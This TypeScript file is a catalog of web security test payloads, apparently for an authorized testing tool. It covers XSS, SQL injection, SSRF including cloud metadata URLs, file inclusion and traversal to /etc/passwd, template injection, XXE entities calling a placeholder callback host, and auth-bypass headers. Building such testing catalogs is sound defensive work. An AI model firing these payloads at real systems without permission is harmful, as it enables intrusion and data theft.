// SPDX-License-Identifier: Apache-2.0
import type { PayloadCategory, PayloadDef } from "@/types/catalog";

export const PAYLOAD_CATEGORY_LABELS: Record<PayloadCategory, string> = {
  xss: "Cross-site scripting",
  sqli: "SQL injection",
  ssrf: "Server-side request forgery",
  lfi: "Local file inclusion",
  "path-traversal": "Path traversal",
  ssti: "Template injection",
  xxe: "XML external entities",
  auth: "Authentication testing",
  "input-validation": "Input validation",
  http: "HTTP security",
};

const p = (id: string, category: PayloadCategory, title: string, payload: string, context: string, description: string, tags: string[] = []): PayloadDef => ({
  id,
  category,
  title,
  payload,
  context,
  description,
  tags,
});

/**
 * Well-known, non-destructive proof-of-concept strings as documented by the
 * OWASP Web Security Testing Guide and PortSwigger Web Security Academy.
 * For use only against applications you are authorized to test.
 */
export const PAYLOADS: PayloadDef[] = [
  // XSS
  p("xss-basic", "xss", "Script tag", "<script>alert(document.domain)</script>", "HTML body", "Baseline reflected/stored XSS check; shows the executing origin.", ["reflected", "stored"]),
  p("xss-svg", "xss", "SVG onload", "<svg onload=alert(document.domain)>", "HTML body", "Executes without a closing tag; useful when <script> is filtered."),
  p("xss-img", "xss", "Image onerror", "<img src=x onerror=alert(document.domain)>", "HTML body", "Event-handler based execution through a broken image."),
  p("xss-attr-break", "xss", "Attribute breakout", "\"><svg onload=alert(1)>", "HTML attribute (double-quoted)", "Closes a quoted attribute and the tag before injecting markup."),
  p("xss-js-string", "xss", "JavaScript string breakout", "';alert(document.domain);//", "Inside a JS string literal", "Terminates a single-quoted string inside a script block."),
  p("xss-polyglot-probe", "xss", "Reflection probe", "chx'\"<>`${{}}", "Any parameter", "Harmless canary to see which characters are reflected unencoded."),
  p("xss-href", "xss", "JavaScript URL", "javascript:alert(document.domain)", "href / src attribute", "Checks whether user-supplied links allow the javascript: scheme."),

  // SQL injection
  p("sqli-quote", "sqli", "Single quote", "'", "Query parameter", "Triggers a syntax error when input is concatenated into SQL.", ["error-based"]),
  p("sqli-boolean-true", "sqli", "Boolean true", "' OR '1'='1' -- -", "String parameter", "Compare with the false variant to detect boolean-based injection.", ["boolean"]),
  p("sqli-boolean-false", "sqli", "Boolean false", "' AND '1'='2' -- -", "String parameter", "Pair with the true variant; differing responses suggest injection.", ["boolean"]),
  p("sqli-numeric", "sqli", "Numeric arithmetic", "1+1", "Numeric parameter", "If the response for 1+1 equals that for 2, the value is evaluated by the database."),
  p("sqli-time-mysql", "sqli", "Time delay (MySQL)", "' AND SLEEP(5)-- -", "String parameter", "A ~5 s delay indicates blind injection on MySQL/MariaDB.", ["time-based", "mysql"]),
  p("sqli-time-pg", "sqli", "Time delay (PostgreSQL)", "'; SELECT pg_sleep(5)-- -", "String parameter", "Stacked-query delay for PostgreSQL.", ["time-based", "postgresql"]),
  p("sqli-time-mssql", "sqli", "Time delay (SQL Server)", "'; WAITFOR DELAY '0:0:5'-- -", "String parameter", "Stacked-query delay for Microsoft SQL Server.", ["time-based", "mssql"]),
  p("sqli-order", "sqli", "ORDER BY column probe", "1 ORDER BY 1-- -", "Numeric parameter", "Increment the number to find the column count."),

  // SSRF
  p("ssrf-loopback", "ssrf", "Loopback", "http://127.0.0.1/", "URL parameter", "Checks whether the server fetches loopback addresses."),
  p("ssrf-localhost-port", "ssrf", "Loopback with port", "http://127.0.0.1:22/", "URL parameter", "Response differences across ports can reveal internal services."),
  p("ssrf-aws-metadata", "ssrf", "Cloud metadata (AWS IMDS)", "http://169.254.169.254/latest/meta-data/", "URL parameter", "Classic cloud metadata endpoint; access indicates high-impact SSRF.", ["cloud"]),
  p("ssrf-gcp-metadata", "ssrf", "Cloud metadata (GCP)", "http://metadata.google.internal/computeMetadata/v1/", "URL parameter", "Google Cloud metadata server (requires Metadata-Flavor header).", ["cloud"]),
  p("ssrf-ipv6", "ssrf", "IPv6 loopback", "http://[::1]/", "URL parameter", "Bypass attempt for filters that only block IPv4 loopback."),
  p("ssrf-decimal", "ssrf", "Decimal IP encoding", "http://2130706433/", "URL parameter", "127.0.0.1 written as a decimal integer, to test filter normalization."),
  p("ssrf-oob", "ssrf", "Out-of-band callback", "http://YOUR-COLLABORATOR-HOST/", "URL parameter", "Replace with your own callback host (e.g. Burp Collaborator) to detect blind SSRF."),

  // LFI
  p("lfi-passwd", "lfi", "Unix passwd", "../../../../etc/passwd", "File parameter", "Standard readable file used to confirm inclusion on Linux."),
  p("lfi-win-ini", "lfi", "Windows win.ini", "..\\..\\..\\..\\windows\\win.ini", "File parameter", "Standard readable file used to confirm inclusion on Windows."),
  p("lfi-null", "lfi", "Extension bypass (legacy)", "../../../../etc/passwd%00", "File parameter", "Null-byte truncation against legacy runtimes that append extensions."),
  p("lfi-php-filter", "lfi", "PHP filter wrapper", "php://filter/convert.base64-encode/resource=index.php", "PHP include parameter", "Reads source code as base64 instead of executing it."),
  p("lfi-proc", "lfi", "Process environment", "/proc/self/environ", "File parameter", "Linux process environment; may disclose configuration."),
  p("lfi-absolute", "lfi", "Absolute path", "/etc/hosts", "File parameter", "Checks whether absolute paths are accepted."),

  // Path traversal
  p("pt-basic", "path-traversal", "Relative traversal", "../../../etc/passwd", "Filename parameter", "Simple traversal sequence."),
  p("pt-nested", "path-traversal", "Nested sequences", "....//....//....//etc/passwd", "Filename parameter", "Survives filters that strip ../ once."),
  p("pt-encoded", "path-traversal", "URL-encoded", "..%2f..%2f..%2fetc%2fpasswd", "Filename parameter", "Encoded slashes to bypass naive filters."),
  p("pt-double-encoded", "path-traversal", "Double URL-encoded", "..%252f..%252f..%252fetc%252fpasswd", "Filename parameter", "Double encoding for filters that decode once."),
  p("pt-backslash", "path-traversal", "Backslash variant", "..\\..\\..\\windows\\win.ini", "Filename parameter (Windows)", "Windows-style separators."),
  p("pt-prefix", "path-traversal", "Required prefix", "/var/www/images/../../../etc/passwd", "Filename parameter", "When the application requires a base folder prefix."),

  // SSTI
  p("ssti-arith-jinja", "ssti", "Arithmetic (Jinja2/Twig)", "{{7*7}}", "Template-rendered field", "Renders 49 in Jinja2 and Twig; 7777777 in Jinja2 for {{7*'7'}}.", ["detection"]),
  p("ssti-arith-dollar", "ssti", "Arithmetic (FreeMarker/EL)", "${7*7}", "Template-rendered field", "Detection probe for FreeMarker, Velocity-like and Java EL engines."),
  p("ssti-erb", "ssti", "Arithmetic (ERB)", "<%= 7*7 %>", "Template-rendered field", "Ruby ERB detection probe."),
  p("ssti-polyglot", "ssti", "Engine fingerprint polyglot", "${{<%[%'\"}}%\\.", "Template-rendered field", "Error-inducing string to reveal template engine errors."),
  p("ssti-jinja-string", "ssti", "Jinja2 vs Twig", "{{7*'7'}}", "Template-rendered field", "7777777 indicates Jinja2; 49 indicates Twig."),
  p("ssti-thymeleaf", "ssti", "Arithmetic (Thymeleaf)", "[[${7*7}]]", "Template-rendered field", "Inline expression probe for Thymeleaf."),

  // XXE
  p("xxe-file", "xxe", "External entity file read", '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>\n<r>&xxe;</r>', "XML request body", "Classic in-band XXE proof of concept using a benign file."),
  p("xxe-oob", "xxe", "Out-of-band entity", '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-HOST/">]>\n<r>&xxe;</r>', "XML request body", "Detect blind XXE with your own callback host."),
  p("xxe-param", "xxe", "Parameter entity probe", '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % p SYSTEM "http://YOUR-COLLABORATOR-HOST/p"> %p;]>\n<r/>', "XML request body", "Parameter entities work where general entities are blocked."),
  p("xxe-xinclude", "xxe", "XInclude", '<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></x>', "XML fragment inside a parameter", "When you only control part of an XML document."),
  p("xxe-svg", "xxe", "SVG upload", '<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>', "Image upload (SVG)", "SVG files processed server-side with an XML parser."),
  p("xxe-content-type", "xxe", "JSON → XML switch", '<?xml version="1.0"?><root><test>1</test></root>', "Body with Content-Type: application/xml", "Check whether a JSON endpoint also accepts XML."),

  // Authentication testing
  p("auth-xff", "auth", "X-Forwarded-For localhost", "X-Forwarded-For: 127.0.0.1", "Request header", "Tests IP-based access controls that trust forwarding headers."),
  p("auth-xoriginal", "auth", "X-Original-URL override", "X-Original-URL: /admin", "Request header", "Some proxies route based on this header, bypassing path ACLs."),
  p("auth-jwt-none", "auth", "JWT alg none header", '{"alg":"none","typ":"JWT"}', "JWT header (base64url-encode)", "Checks whether the server accepts unsigned tokens."),
  p("auth-default-creds", "auth", "Default credential check list", "admin:admin\nadmin:password\nroot:root", "Login form", "Short list for verifying vendor defaults were changed (respect lockout policies)."),
  p("auth-username-enum", "auth", "Username enumeration pair", "existing-user@example.com\nnonexistent-7f3a@example.com", "Login / reset form", "Compare responses and timing for a valid vs. invalid account."),
  p("auth-method", "auth", "HTTP method override", "X-HTTP-Method-Override: PUT", "Request header", "Tests whether method-based authorization can be bypassed."),

  // Input validation
  p("iv-long", "input-validation", "Overlong input", "A".repeat(4096), "Any text field", "4 KB of characters to test length validation and truncation."),
  p("iv-unicode", "input-validation", "Unicode normalization", "ﬀ ＜script＞ ǅ İ", "Any text field", "Characters that change under normalization or case folding."),
  p("iv-crlf", "input-validation", "CRLF injection", "test%0d%0aSet-Cookie:%20chx=1", "Parameter reflected in headers", "Detects header injection / response splitting."),
  p("iv-format", "input-validation", "Format string", "%s%s%s%n%x", "Any text field", "Probes for unsafe format-string handling in native code."),
  p("iv-negative", "input-validation", "Boundary numbers", "-1\n0\n2147483648\n9999999999999999999", "Numeric fields", "Negative, zero and overflow values."),
  p("iv-csv", "input-validation", "CSV formula injection", "=1+1", "Fields exported to spreadsheets", "If an export evaluates this as 2, formula injection is possible."),

  // HTTP security
  p("http-host", "http", "Host header injection", "Host: attacker.example", "Request header", "Tests whether the application trusts the Host header (password reset links, caches)."),
  p("http-xfh", "http", "X-Forwarded-Host", "X-Forwarded-Host: attacker.example", "Request header", "Alternative host override honored by many frameworks."),
  p("http-origin", "http", "CORS origin reflection", "Origin: https://attacker.example", "Request header", "Check whether Access-Control-Allow-Origin reflects arbitrary origins."),
  p("http-null-origin", "http", "CORS null origin", "Origin: null", "Request header", "Some CORS policies mistakenly allow the null origin."),
  p("http-open-redirect", "http", "Open redirect", "//attacker.example/%2f..", "Redirect parameter", "Protocol-relative URL to test redirect validation."),
  p("http-trace", "http", "TRACE method", "TRACE / HTTP/1.1", "Request line", "Checks whether TRACE is enabled on the server."),
];
